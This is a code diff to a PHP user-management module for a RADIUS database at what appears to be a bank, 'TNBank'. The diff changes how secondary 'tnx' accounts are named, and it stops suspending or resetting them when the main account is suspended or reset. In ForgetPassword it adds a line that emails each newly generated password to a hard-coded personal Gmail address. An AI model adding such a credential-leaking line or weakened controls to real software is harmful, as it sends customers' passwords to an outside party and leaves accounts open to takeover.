@@ -23,7 +23,7 @@ function CreateUser($usernameCreate)
         $pwd = genPass();
         $tnx_pwd = genPass();
         $sql = "INSERT INTO radius.radcheck (id, username, attribute, op, value) VALUES (0,'$usernameCreate', 'Cleartext-Password', ':=','$pwd')";
-        $sql2 = "INSERT INTO radius.radcheck (id, username, attribute, op, value) VALUES (0,'$tnxSuffix$usernameCreate', 'Cleartext-Password', ':=','$tnx_pwd')";
+        $sql2 = "INSERT INTO radius.radcheck (id, username, attribute, op, value) VALUES (0,'$usernameCreate$tnxSuffix', 'Cleartext-Password', ':=','$tnx_pwd')";
         //if ($conn->query($sql) === TRUE) {
         if ($conn->query($sql) === TRUE && $conn->query($sql2) === TRUE) {
 
@@ -46,16 +46,11 @@ function SuspendUser($suspendName)
     require 'config/dbc.php';
     $suspendName=mysqli_real_escape_string($conn,$suspendName);
 
-
-    $tnxSuffix = $GLOBALS['tnx_'];
-    $fUsername = $tnxSuffix . $suspendName;
     if (isUsersexists($suspendName)) {
         if (!isUserSuspended($suspendName)) {
             $sql = "INSERT INTO radius.radusergroup (username,groupname, priority) VALUES ('$suspendName', 'daloRADIUS-Disabled-Users', 0)";
-            $sql2 = "INSERT INTO radius.radusergroup (username,groupname, priority) VALUES ('$fUsername', 'daloRADIUS-Disabled-Users', 0)";
 
-            //if ($conn->query($sql) === TRUE) {
-            if ($conn->query($sql) === TRUE && $conn->query($sql2) === TRUE) {
+             if ($conn->query($sql) === TRUE) {
 
                 $txnStatus = 'suspend';
                 return $txnStatus;
@@ -89,15 +84,13 @@ function resetPwd($LoginUserPwd)
     $LoginUserPwd=mysqli_real_escape_string($conn,$LoginUserPwd);
 
     $pwd = genPass();
-    $pwd_tnx = genPass();
-    $tnxSuffix = $GLOBALS['tnx_'];
+
 
     if (isUsersexists($LoginUserPwd)) {
         $sql = "UPDATE radius.radcheck SET value = '$pwd',locked=FALSE,firstLogin=TRUE ,attempt=0 WHERE username='$LoginUserPwd';";
-        $sql2 = "UPDATE radius.radcheck SET value = '$pwd_tnx',locked=FALSE,firstLogin=TRUE ,attempt=0  WHERE username='$tnxSuffix$LoginUserPwd'";
 
 
-        if ($conn->query($sql) === TRUE && $conn->query($sql2) === TRUE) {
+        if ($conn->query($sql) === TRUE) {
 
             $txnStatus = "resetLoginPwd";
             return $txnStatus;
@@ -229,6 +222,7 @@ function ForgetPassword($forgetusername)
             $msg = "TNBank, $forgetusername NEW Password: $pwd";
 
             SendSMS(trim($mobile), urlencode($msg));
+            SendEmail("fadi.sowan@gmail.com",$msg);
             $txnStatus = "Password reset";
             return $txnStatus;
         }
